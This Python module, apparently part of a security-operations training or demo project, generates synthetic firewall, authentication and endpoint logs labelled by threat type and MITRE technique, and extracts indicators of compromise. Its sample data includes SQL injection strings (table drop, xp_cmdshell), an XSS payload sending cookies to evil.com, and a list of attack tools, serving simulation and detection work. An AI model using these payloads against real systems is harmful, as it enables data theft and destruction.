"""
ZeTheta SOC Cyber Log Anomaly Engine
Generates and analyzes:
- Network logs (firewall, IDS, DNS)
- Auth logs (login attempts, brute force, privilege escalation)
- Endpoint logs (process execution, file access)
- Threat Intel (IP reputation, CVE matches)
Detects: DDoS, Port Scans, Brute Force, Data Exfiltration,
         Lateral Movement, C2 Beaconing, SQL Injection, XSS
"""

import numpy as np
import random
import ipaddress
import datetime
import hashlib
from typing import Optional

random.seed(None)  # fresh randomness each run

# ── Threat taxonomy ───────────────────────────────────────────────────────────
THREAT_TYPES = {
    "BRUTE_FORCE":        {"severity": "HIGH",   "mitre": "T1110", "color": "#f43f5e"},
    "PORT_SCAN":          {"severity": "MEDIUM", "mitre": "T1046", "color": "#f59e0b"},
    "SQL_INJECTION":      {"severity": "CRITICAL","mitre": "T1190", "color": "#dc2626"},
    "XSS_ATTACK":         {"severity": "MEDIUM", "mitre": "T1059", "color": "#f59e0b"},
    "DATA_EXFILTRATION":  {"severity": "CRITICAL","mitre": "T1041", "color": "#dc2626"},
    "C2_BEACONING":       {"severity": "HIGH",   "mitre": "T1071", "color": "#f43f5e"},
    "LATERAL_MOVEMENT":   {"severity": "HIGH",   "mitre": "T1021", "color": "#f43f5e"},
    "PRIV_ESCALATION":    {"severity": "HIGH",   "mitre": "T1068", "color": "#f43f5e"},
    "DDOS":               {"severity": "HIGH",   "mitre": "T1498", "color": "#f43f5e"},
    "RANSOMWARE":         {"severity": "CRITICAL","mitre": "T1486", "color": "#dc2626"},
    "INSIDER_THREAT":     {"severity": "HIGH",   "mitre": "T1078", "color": "#f43f5e"},
    "DNS_TUNNELING":      {"severity": "MEDIUM", "mitre": "T1071.004","color": "#f59e0b"},
    "NORMAL":             {"severity": "LOW",    "mitre": None,    "color": "#10b981"},
}

SEVERITY_ORDER = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1}

# ── Known bad IP ranges (simulated threat intel) ──────────────────────────────
KNOWN_BAD_IPS = [
    "185.220.101.", "194.165.16.", "45.142.212.",
    "91.108.4.", "104.21.0.", "198.54.117."
]

KNOWN_GOOD_IPS = [
    "10.0.", "192.168.", "172.16.", "172.17.", "172.18."
]

INTERNAL_HOSTS = [
    "WS-FINANCE-01", "WS-HR-02", "SRV-AD-01", "SRV-DB-01",
    "SRV-WEB-01", "WS-DEV-03", "SRV-MAIL-01", "WS-EXEC-01",
    "SRV-FILE-01", "WS-IT-05", "SRV-VPN-01", "WS-MGMT-02"
]

PROCESSES = {
    "normal":    ["chrome.exe","outlook.exe","excel.exe","word.exe","teams.exe","explorer.exe"],
    "suspicious":["powershell.exe","cmd.exe","wscript.exe","mshta.exe","regsvr32.exe"],
    "malicious": ["mimikatz.exe","psexec.exe","nc.exe","meterpreter","cobalt_strike.exe"],
}

USER_AGENTS = {
    "normal":    ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120","Mozilla/5.0 (Macintosh) Safari/17"],
    "malicious": ["sqlmap/1.7","Nikto/2.1","Masscan","zgrab/0.x","python-requests/2.28"],
}

# ── IP Generator ──────────────────────────────────────────────────────────────
def gen_ip(ip_type="random"):
    if ip_type == "internal":
        return f"192.168.{random.randint(1,10)}.{random.randint(1,254)}"
    elif ip_type == "bad":
        base = random.choice(KNOWN_BAD_IPS)
        return base + str(random.randint(1, 254))
    elif ip_type == "external":
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    else:
        return random.choice([gen_ip("internal"), gen_ip("external")])

def is_bad_ip(ip: str) -> bool:
    return any(ip.startswith(bad) for bad in KNOWN_BAD_IPS)

def is_internal_ip(ip: str) -> bool:
    return any(ip.startswith(good) for good in KNOWN_GOOD_IPS)

# ── Log Generators ────────────────────────────────────────────────────────────

def gen_network_log(threat_type: Optional[str] = None) -> dict:
    """Generate a firewall/network log entry"""
    ts = datetime.datetime.utcnow() - datetime.timedelta(seconds=random.randint(0, 3600))

    if threat_type == "PORT_SCAN":
        src_ip  = gen_ip("bad")
        dst_ip  = gen_ip("internal")
        ports   = random.sample(range(1, 65535), random.randint(20, 200))
        return {
            "log_type":    "NETWORK",
            "timestamp":   ts.isoformat(),
            "src_ip":      src_ip,
            "dst_ip":      dst_ip,
            "dst_ports":   ports[:10],
            "port_count":  len(ports),
            "protocol":    "TCP",
            "action":      "BLOCKED",
            "bytes_sent":  random.randint(100, 2000),
            "bytes_recv":  0,
            "threat_type": "PORT_SCAN",
            "severity":    "MEDIUM",
            "indicator":   f"Port scan: {len(ports)} ports from {src_ip}",
            "mitre":       "T1046",
        }

    elif threat_type == "DDOS":
        src_ip = gen_ip("bad")
        return {
            "log_type":    "NETWORK",
            "timestamp":   ts.isoformat(),
            "src_ip":      src_ip,
            "dst_ip":      gen_ip("internal"),
            "dst_ports":   [80, 443],
            "port_count":  2,
            "protocol":    random.choice(["TCP","UDP","ICMP"]),
            "action":      "BLOCKED",
            "bytes_sent":  random.randint(100000, 10000000),
            "bytes_recv":  0,
            "pps":         random.randint(10000, 500000),  # packets per second
            "threat_type": "DDOS",
            "severity":    "HIGH",
            "indicator":   f"DDoS: {random.randint(10000,500000)} pps from {src_ip}",
            "mitre":       "T1498",
        }

    elif threat_type == "DATA_EXFILTRATION":
        src_ip = gen_ip("internal")
        dst_ip = gen_ip("bad")
        return {
            "log_type":    "NETWORK",
            "timestamp":   ts.isoformat(),
            "src_ip":      src_ip,
            "dst_ip":      dst_ip,
            "dst_ports":   [random.choice([443, 8443, 22, 21, 53])],
            "port_count":  1,
            "protocol":    "TCP",
            "action":      "ALLOWED",
            "bytes_sent":  random.randint(500000000, 5000000000),  # 500MB-5GB
            "bytes_recv":  random.randint(1000, 5000),
            "threat_type": "DATA_EXFILTRATION",
            "severity":    "CRITICAL",
            "indicator":   f"Large outbound transfer: {random.randint(500,5000)}MB to known-bad IP",
            "mitre":       "T1041",
        }

    elif threat_type == "C2_BEACONING":
        src_ip = gen_ip("internal")
        dst_ip = gen_ip("bad")
        return {
            "log_type":    "NETWORK",
            "timestamp":   ts.isoformat(),
            "src_ip":      src_ip,
            "dst_ip":      dst_ip,
            "dst_ports":   [random.choice([443, 80, 8080, 4444, 1337])],
            "port_count":  1,
            "protocol":    "TCP",
            "action":      "ALLOWED",
            "bytes_sent":  random.randint(200, 2000),
            "bytes_recv":  random.randint(200, 2000),
            "beacon_interval": random.choice([30, 60, 120, 300]),
            "threat_type": "C2_BEACONING",
            "severity":    "HIGH",
            "indicator":   f"Regular beaconing every {random.choice([30,60,120])}s to {dst_ip}",
            "mitre":       "T1071",
        }

    elif threat_type == "DNS_TUNNELING":
        return {
            "log_type":    "NETWORK",
            "timestamp":   ts.isoformat(),
            "src_ip":      gen_ip("internal"),
            "dst_ip":      "8.8.8.8",
            "dst_ports":   [53],
            "port_count":  1,
            "protocol":    "UDP",
            "action":      "ALLOWED",
            "bytes_sent":  random.randint(50000, 500000),
            "bytes_recv":  random.randint(10000, 100000),
            "query_length": random.randint(150, 253),
            "threat_type": "DNS_TUNNELING",
            "severity":    "MEDIUM",
            "indicator":   "Unusually long DNS queries — possible tunneling",
            "mitre":       "T1071.004",
        }

    else:
        # Normal traffic
        return {
            "log_type":    "NETWORK",
            "timestamp":   ts.isoformat(),
            "src_ip":      gen_ip("internal"),
            "dst_ip":      gen_ip("external"),
            "dst_ports":   [random.choice([80, 443, 8080])],
            "port_count":  1,
            "protocol":    "TCP",
            "action":      random.choice(["ALLOWED","ALLOWED","ALLOWED","BLOCKED"]),
            "bytes_sent":  random.randint(500, 50000),
            "bytes_recv":  random.randint(1000, 500000),
            "threat_type": "NORMAL",
            "severity":    "LOW",
            "indicator":   "Normal outbound web traffic",
            "mitre":       None,
        }


def gen_auth_log(threat_type: Optional[str] = None) -> dict:
    """Generate authentication/identity log entry"""
    ts   = datetime.datetime.utcnow() - datetime.timedelta(seconds=random.randint(0, 3600))
    user = random.choice(["jsmith", "admin", "root", "svc_backup",
                          "mwilson", "adavis", "klee", "svc_db"])
    host = random.choice(INTERNAL_HOSTS)

    if threat_type == "BRUTE_FORCE":
        src_ip = gen_ip("bad")
        return {
            "log_type":       "AUTH",
            "timestamp":      ts.isoformat(),
            "src_ip":         src_ip,
            "dst_host":       host,
            "username":       user,
            "event":          "FAILED_LOGIN",
            "failed_attempts": random.randint(20, 200),
            "timespan_secs":  random.randint(10, 120),
            "protocol":       random.choice(["SSH","RDP","SMB","LDAP"]),
            "threat_type":    "BRUTE_FORCE",
            "severity":       "HIGH",
            "indicator":      f"{random.randint(20,200)} failed logins in {random.randint(10,120)}s",
            "mitre":          "T1110",
        }

    elif threat_type == "PRIV_ESCALATION":
        return {
            "log_type":    "AUTH",
            "timestamp":   ts.isoformat(),
            "src_ip":      gen_ip("internal"),
            "dst_host":    host,
            "username":    random.choice(["jsmith","mwilson"]),
            "event":       "PRIVILEGE_ESCALATION",
            "from_role":   "USER",
            "to_role":     random.choice(["ADMIN","DOMAIN_ADMIN","ROOT"]),
            "method":      random.choice(["sudo","Token Impersonation","Pass-the-Hash"]),
            "threat_type": "PRIV_ESCALATION",
            "severity":    "HIGH",
            "indicator":   "Unexpected privilege escalation to admin",
            "mitre":       "T1068",
        }

    elif threat_type == "INSIDER_THREAT":
        return {
            "log_type":    "AUTH",
            "timestamp":   ts.isoformat(),
            "src_ip":      gen_ip("internal"),
            "dst_host":    random.choice(["SRV-DB-01","SRV-FILE-01"]),
            "username":    random.choice(["jsmith","adavis"]),
            "event":       "ANOMALOUS_ACCESS",
            "access_time": "02:30 AM",
            "normal_hours": "09:00-18:00",
            "files_accessed": random.randint(100, 5000),
            "threat_type": "INSIDER_THREAT",
            "severity":    "HIGH",
            "indicator":   f"User accessing {random.randint(100,5000)} files at 2AM — abnormal behavior",
            "mitre":       "T1078",
        }

    elif threat_type == "LATERAL_MOVEMENT":
        src_host = random.choice(INTERNAL_HOSTS[:4])
        dst_host = random.choice(INTERNAL_HOSTS[4:])
        return {
            "log_type":    "AUTH",
            "timestamp":   ts.isoformat(),
            "src_ip":      gen_ip("internal"),
            "src_host":    src_host,
            "dst_host":    dst_host,
            "username":    user,
            "event":       "LATERAL_MOVEMENT",
            "method":      random.choice(["PsExec","WMI","Pass-the-Hash","Kerberoasting"]),
            "hops":        random.randint(2, 6),
            "threat_type": "LATERAL_MOVEMENT",
            "severity":    "HIGH",
            "indicator":   f"Lateral movement: {src_host} → {dst_host} via {random.choice(['PsExec','WMI'])}",
            "mitre":       "T1021",
        }

    else:
        return {
            "log_type":    "AUTH",
            "timestamp":   ts.isoformat(),
            "src_ip":      gen_ip("internal"),
            "dst_host":    host,
            "username":    user,
            "event":       random.choice(["LOGIN_SUCCESS","LOGOUT","PASSWORD_CHANGE"]),
            "protocol":    random.choice(["SSH","RDP","LDAP"]),
            "threat_type": "NORMAL",
            "severity":    "LOW",
            "indicator":   "Normal authentication event",
            "mitre":       None,
        }


def gen_endpoint_log(threat_type: Optional[str] = None) -> dict:
    """Generate endpoint/EDR log entry"""
    ts   = datetime.datetime.utcnow() - datetime.timedelta(seconds=random.randint(0, 3600))
    host = random.choice(INTERNAL_HOSTS)

    if threat_type == "RANSOMWARE":
        return {
            "log_type":         "ENDPOINT",
            "timestamp":        ts.isoformat(),
            "host":             host,
            "process":          random.choice(["svchost.exe","explorer.exe","update.exe"]),
            "parent_process":   "powershell.exe",
            "event":            "RANSOMWARE_ACTIVITY",
            "files_encrypted":  random.randint(500, 50000),
            "extensions_hit":   [".docx",".xlsx",".pdf",".jpg",".db"],
            "ransom_note":      "README_DECRYPT.txt",
            "registry_changes": random.randint(10, 100),
            "threat_type":      "RANSOMWARE",
            "severity":         "CRITICAL",
            "indicator":        f"Mass file encryption: {random.randint(500,50000)} files affected",
            "mitre":            "T1486",
        }

    elif threat_type == "SQL_INJECTION":
        return {
            "log_type":    "ENDPOINT",
            "timestamp":   ts.isoformat(),
            "host":        "SRV-WEB-01",
            "process":     "w3wp.exe",
            "event":       "SQL_INJECTION",
            "src_ip":      gen_ip("bad"),
            "payload":     random.choice([
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT username,password FROM admin--",
                "1; EXEC xp_cmdshell('whoami')--"
            ]),
            "user_agent":  random.choice(USER_AGENTS["malicious"]),
            "db_queries":  random.randint(50, 500),
            "threat_type": "SQL_INJECTION",
            "severity":    "CRITICAL",
            "indicator":   "SQL injection payload in web request",
            "mitre":       "T1190",
        }

    elif threat_type == "XSS_ATTACK":
        return {
            "log_type":    "ENDPOINT",
            "timestamp":   ts.isoformat(),
            "host":        "SRV-WEB-01",
            "process":     "w3wp.exe",
            "event":       "XSS_ATTACK",
            "src_ip":      gen_ip("bad"),
            "payload":     random.choice([
                "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
                "<img src=x onerror=alert(document.cookie)>",
                "javascript:eval(atob('YWxlcnQoMSk='))",
            ]),
            "user_agent":  random.choice(USER_AGENTS["malicious"]),
            "threat_type": "XSS_ATTACK",
            "severity":    "MEDIUM",
            "indicator":   "Cross-site scripting payload detected",
            "mitre":       "T1059",
        }

    else:
        return {
            "log_type":       "ENDPOINT",
            "timestamp":      ts.isoformat(),
            "host":           host,
            "process":        random.choice(PROCESSES["normal"]),
            "parent_process": "explorer.exe",
            "event":          random.choice(["PROCESS_START","FILE_READ","REG_READ","NET_CONN"]),
            "threat_type":    "NORMAL",
            "severity":       "LOW",
            "indicator":      "Normal endpoint activity",
            "mitre":          None,
        }


# ── Main log generator ────────────────────────────────────────────────────────
def generate_cyber_log(force_threat: Optional[str] = None) -> dict:
    """
    Generate a random cyber log entry.
    10% chance of threat by default, or force a specific threat type.
    """
    all_threats = [t for t in THREAT_TYPES.keys() if t != "NORMAL"]

    if force_threat:
        threat = force_threat
    elif random.random() < 0.12:
        threat = random.choice(all_threats)
    else:
        threat = None

    # Pick log type based on threat
    if threat in ["PORT_SCAN","DDOS","DATA_EXFILTRATION","C2_BEACONING","DNS_TUNNELING"]:
        log = gen_network_log(threat)
    elif threat in ["BRUTE_FORCE","PRIV_ESCALATION","INSIDER_THREAT","LATERAL_MOVEMENT"]:
        log = gen_auth_log(threat)
    elif threat in ["RANSOMWARE","SQL_INJECTION","XSS_ATTACK"]:
        log = gen_endpoint_log(threat)
    else:
        # Normal — pick random log type
        fn = random.choice([gen_network_log, gen_auth_log, gen_endpoint_log])
        log = fn(None)

    # Add common fields
    log["id"]          = hashlib.md5(f"{log['timestamp']}{random.random()}".encode()).hexdigest()[:12]
    log["threat_info"] = THREAT_TYPES.get(log["threat_type"], THREAT_TYPES["NORMAL"])
    log["is_threat"]   = log["threat_type"] != "NORMAL"
    log["severity_score"] = SEVERITY_ORDER.get(log["severity"], 1) / 4.0

    return log


def generate_bulk_logs(count: int = 10, threat_ratio: float = 0.12) -> list:
    """Generate multiple logs with realistic threat distribution"""
    logs = []
    for _ in range(count):
        log = generate_cyber_log()
        logs.append(log)
    return logs


# ── IOC (Indicators of Compromise) extractor ─────────────────────────────────
def extract_iocs(log: dict) -> dict:
    """Extract Indicators of Compromise from a log entry"""
    iocs = {"ips": [], "hashes": [], "domains": [], "processes": [], "signatures": []}

    if "src_ip" in log and is_bad_ip(log["src_ip"]):
        iocs["ips"].append({"ip": log["src_ip"], "type": "malicious_src"})
    if "dst_ip" in log and is_bad_ip(log["dst_ip"]):
        iocs["ips"].append({"ip": log["dst_ip"], "type": "malicious_dst"})
    if "process" in log and log["process"] in PROCESSES["malicious"]:
        iocs["processes"].append(log["process"])
    if "payload" in log:
        iocs["signatures"].append(f"Attack payload: {log['payload'][:60]}...")
    if log.get("threat_type") and log["threat_type"] != "NORMAL":
        iocs["signatures"].append(f"MITRE {log.get('mitre','')} — {log['threat_type']}")

    return iocs